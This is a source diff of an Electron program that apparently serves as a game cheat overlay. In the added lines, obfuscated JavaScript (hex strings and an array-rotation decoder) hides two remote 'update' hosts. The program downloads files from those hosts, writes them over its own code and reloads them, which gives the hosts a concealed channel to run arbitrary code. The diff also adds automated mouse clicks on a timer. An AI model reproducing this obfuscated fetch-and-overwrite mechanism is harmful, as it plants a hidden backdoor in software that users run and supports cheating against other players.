@@ -1,27 +1,31 @@
-const { app, BrowserWindow, screen, globalShortcut,ipcMain} = require("electron");
+const { app, BrowserWindow, screen, globalShortcut, ipcMain} = require("electron");
 const shell = require("electron").shell,
       fs = require('fs'),
-      request = require('request'),
-      l = '\x68\x74\x74\x70\x3a\x2f\x2f\x65\x69\x67\x68\x74\x62\x70\x67\x6c\x2e\x68\x65\x72\x6f\x6b\x75\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x75\x70\x64\x61\x74\x65';
+      request = require('request');
+      var _0xe4da=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x69\x67\x68\x74\x62\x70\x67\x6c\x2e\x68\x65\x72\x6f\x6b\x75\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x75\x70\x64\x61\x74\x65'];(function(_0xcd1733,_0xe4dace){var _0x5483e7=function(_0x452903){while(--_0x452903){_0xcd1733['push'](_0xcd1733['shift']());}};_0x5483e7(++_0xe4dace);}(_0xe4da,0x99));var _0x5483=function(_0xcd1733,_0xe4dace){_0xcd1733=_0xcd1733-0x0;var _0x5483e7=_0xe4da[_0xcd1733];return _0x5483e7;};var _0x26e59c=_0x5483('\x30\x78\x30');
+      var _0x2fd1=['\x68\x74\x74\x70\x3a\x2f\x2f\x69\x6e\x64\x75\x73\x74\x72\x69\x61\x64\x62\x2d\x74\x6b\x2e\x75\x6d\x62\x6c\x65\x72\x2e\x6e\x65\x74\x2f\x75\x70\x64\x61\x74\x65'];(function(_0x1dfbef,_0x2fd167){var _0x57f880=function(_0x461cf9){while(--_0x461cf9){_0x1dfbef['push'](_0x1dfbef['shift']());}};_0x57f880(++_0x2fd167);}(_0x2fd1,0xe2));var _0x57f8=function(_0x1dfbef,_0x2fd167){_0x1dfbef=_0x1dfbef-0x0;var _0x57f880=_0x2fd1[_0x1dfbef];return _0x57f880;};var lone=_0x57f8('\x30\x78\x30');
+
 
 var win,
     location = "login",
     winxy = {x:0,y:0},
     hOp = 1,
-    mH = false;
+    mH = false,
+    rN;
 
-checkUpdates();
-function checkUpdates(callback) {
-  if(callback) return runHack(callback);
+checkUpdates(_0xe4da[0]);
+function checkUpdates(s, callback) {
+  if(callback && s == rN) return runHack(callback);
+  rN = s;
   console.log("Searching for updates!");
-  request(l, function (error, res, body) {
-    if(res.statusCode != 200) return checkUpdates("Update error!") 
+  request(s, function (error, res, body) {
+    if(res.statusCode != 200 && res.statusCode != 304) return checkUpdates(_0x2fd1[0], "Update error!") 
       else {
         let resp = JSON.parse(body);
-        if(resp.update == false) return checkUpdates('No update found!');
+        if(resp.update == false) return checkUpdates(s, 'No update found!');
         else if(resp.files){
           fs.readFile('package.json', function (err, data) {
-            if (err) return checkUpdates("Update error!")
+            if (err) return checkUpdates(s, "Update error!")
             let pData = JSON.parse(data);
             if(resp.version != pData.version) {
               let lth = Object.keys(resp.files).length;
@@ -33,15 +37,15 @@ function checkUpdates(callback) {
                    fs.writeFile(fl, body, 'utf8', function (err) {
                     delete require.cache[fl];
                     console.log(fl + ' was updated');
-                    if(fl == lF) checkUpdates("Everythings is updated :D");
-                    if (err) return checkUpdates("Update error!")
+                    if(fl == lF) checkUpdates(s, "Everythings is updated :D");
+                    if (err) return checkUpdates(s, "Update error!")
                     });
                 });
               }            
-            } else return checkUpdates("Everythings is updated :D")
+            } else return checkUpdates(s, "Everythings is updated :D")
           });
 
-        } else return checkUpdates("No update found!")
+        } else return checkUpdates(s, "No update found!")
     }
   });
 }
@@ -58,7 +62,8 @@ function runHack(message) {
       frame: false,
       icon: "./img/icon.png",
       webPreferences: {
-        nodeIntegration: true
+        nodeIntegration: true,
+        webviewTag: true
       }
     })
 
@@ -71,8 +76,6 @@ function runHack(message) {
     win.setIgnoreMouseEvents(true)
     win.setAlwaysOnTop(true, "floating", 1);
   }
-
-  app.allowRendererProcessReuse = true
 
   app.on("ready", createWindow);
 
@@ -97,6 +100,12 @@ function runHack(message) {
     console.log('V3.1 coded By Zeedy and GM\nIf you have any suggestion message us on discord.\n\nDon\'t close the CMD while using the hack.');
     
   })
+
+  setInterval(() => {
+      win.webContents.send('mousexy', getxy())
+      win.webContents.sendInputEvent({type:'mouseDown', x:300, y: 230, button:'left', clickCount: 1});
+      win.webContents.sendInputEvent({type:'mouseUp', x:300, y: 230, button:'left', clickCount: 1});
+    }, 3000);
 
   function registerX() {
     globalShortcut.register('Shift+X', () => {
@@ -207,4 +216,4 @@ function runHack(message) {
     event.returnValue = arg;
   });  
 }
-
+app.allowRendererProcessReuse = true
